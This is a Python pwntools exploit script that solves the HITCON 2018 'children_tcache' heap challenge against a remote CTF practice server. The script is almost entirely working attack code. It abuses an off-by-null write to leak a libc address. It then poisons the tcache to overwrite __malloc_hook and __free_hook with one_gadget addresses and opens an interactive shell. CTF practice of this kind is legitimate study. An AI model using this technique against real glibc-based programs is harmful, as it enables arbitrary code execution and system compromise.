import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='HITCON_2018_children_tcache'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',26402)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x41602,0x41656,0xdef36]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=pdbg.run("remote")
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]


		def add(a,c):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Size:',str(a))
			io.sendafter('Data:',c)

		def delete(a):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Index:',str(a))

		def show(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Index:',str(a))
		

		add(0x488,'a'*0x20)
		add(0x88,'a'*0x20)
		add(0x78,'a'*0x20)
		add(0x68,'a'*0x20)
		add(0x4f8,'a'*0x20)
		add(0x68,'/bin/sh\x00'*0x5)
		delete(3)
		add(0x68,'a'*0x68)
		delete(3)
		add(0x67,'a'*0x67)
		delete(3)
		add(0x66,'a'*0x66)
		delete(3)
		add(0x65,'a'*0x65)
		delete(3)
		add(0x64,'a'*0x64)
		delete(3)
		add(0x63,'a'*0x63)
		delete(3)
		add(0x62,'a'*0x62)
		delete(3)
		add(0x61,'a'*0x61)
		delete(3)
		add(0x60,'a'*0x60)
		delete(3)
		add(0x68,'a'*0x60+'\x10\x06')
		delete(0)
		delete(4)
		add(0x488,'a'*0x20)
		show(1)


		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		delete(3)
		add(0x60,'aaaaaaaaa;ls\x00')
		add(0x88,'a'*0x20)
		add(0x89,'a')
		delete(1)
		delete(4)
		add(0x88,p64(libc.sym['__malloc_hook']))
		add(0x88,p64(libc.sym['__free_hook']))
		add(0x88,p64(libc_base+one_gadgaet[1]))
		# delete(6)
		








		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue